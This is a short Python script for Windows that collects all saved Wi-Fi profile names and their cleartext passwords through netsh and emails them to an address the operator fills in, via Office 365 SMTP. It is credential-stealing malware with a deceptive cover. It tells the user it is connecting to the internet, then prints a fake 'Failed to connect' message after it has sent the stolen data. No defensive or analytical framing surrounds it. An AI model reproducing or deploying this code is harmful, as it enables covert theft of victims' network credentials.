import subprocess
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Get Wi-Fi profiles and passwords
def get_wifi_profiles():
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        return [line.split(':')[1].strip() for line in output if "All User Profile" in line]
    except subprocess.CalledProcessError:
        return []

def get_wifi_password(profile):
    try:
        password_output = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
        password_lines = [line.split(':')[1].strip() for line in password_output if "Key Content" in line]
        return password_lines[0] if password_lines else None
    except subprocess.CalledProcessError:
        return None

# Send profiles and passwords via email using Outlook
def send_data_via_email(data):
    # Replace with your Outlook email and app password
    sender_email = ""
    receiver_email = ""
    password = ""

    subject = "Wi-Fi Credentials"
    body = "\n".join([f"Network: {network['network_name']}, Password: {network['password']}" for network in data])

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    # Send the email
    try:
        with smtplib.SMTP("smtp.office365.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        print("Failed to connect to the Internet.")
    except Exception as e:
        print(f"Failed to send email. Error: {e}")

# Main function
def main():
    print("Please wait while we connect to the internet...")  

    profiles = get_wifi_profiles()
    data = [{'network_name': profile, 'password': get_wifi_password(profile)} for profile in profiles if get_wifi_password(profile)]

    if data:
        send_data_via_email(data)
    else:
        print("No Wi-Fi profiles found or passwords could not be retrieved.")

    # Wait for Ctrl+C
    try:
        print("\nProcess completed. Press Ctrl+C to exit.")
        while True:
            time.sleep(0.1)  # Fast polling without delay
    except KeyboardInterrupt:
        print("\nExiting program.")

if __name__ == "__main__":
    main()
